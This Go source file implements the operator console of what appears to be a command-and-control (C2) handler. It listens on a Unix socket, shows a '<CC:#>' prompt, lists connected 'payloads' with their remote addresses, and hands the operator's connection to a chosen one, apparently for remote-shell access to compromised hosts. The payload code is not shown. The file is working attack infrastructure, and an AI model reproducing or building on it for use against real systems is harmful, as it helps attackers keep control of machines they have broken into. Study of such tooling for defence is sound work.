package server

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"github.com/gookit/color"
	"log"
	"net"
	"os"
	"strings"
	"sync"
)

type ControlServer struct {
	Sock string
	Connections []net.Conn
}

func (c *ControlServer) Run(r *Runner, wg *sync.WaitGroup, ctx context.Context) {
	l := c.listen()

	go func () {
		<-ctx.Done()

		for _, conn := range c.Connections {
			conn.Close()
		}

		l.Close()
		os.Remove(c.Sock)
	}()

	c.accept(l, r, ctx)
	wg.Done()
}

func (c *ControlServer) listen() net.Listener {
	l, err := net.Listen("unix", c.Sock)

	if err != nil {
		log.Printf("[UNIX] Listen on %s: %v\n", c.Sock, err)
		os.Exit(1)
	}

	log.Printf("[UNIX] Listening on %s\n", c.Sock)

	return l
}

func (c *ControlServer) accept(l net.Listener, r *Runner, ctx context.Context) {
	for {
		conn, err := l.Accept()

		if err != nil {
			break
		}

		go c.handle(conn, r, ctx)
	}
}

func (c *ControlServer) handle(conn net.Conn, r *Runner, ctx context.Context) {
	reader := bufio.NewReader(conn)
	c.Connections = append(c.Connections, conn)

	for {
		text := color.Green.Text("<CC:#> ")
		conn.Write([]byte(text))

		text, err := reader.ReadString('\n')

		if err != nil {
			break
		}

		text = strings.TrimSpace(text)
		cont := strings.Split(text, " ")

		switch {
		case cont[0] == "show":
			var buffer bytes.Buffer

			for i, p := range r.Payloads {
				s := fmt.Sprintf("ID: %d Address: %s\n", i, p.Addr.String())
				buffer.WriteString(s)
			}

			conn.Write(buffer.Bytes())

		case cont[0] == "use":
			if len(cont) < 2 {
				continue
			}

			p, err := r.getPayload(strings.TrimSpace(cont[1]))
			if err != nil {
				s := fmt.Sprintf("Getting payload %s\n", err)
				conn.Write([]byte(s))
				continue
			}

			p.Activate(conn)
		case text == "exit":
			conn.Write([]byte("Bye 😈\n"))
			return
		default:
			conn.Write([]byte("Unknown command use help to see command list\n"))
		}
	}
}
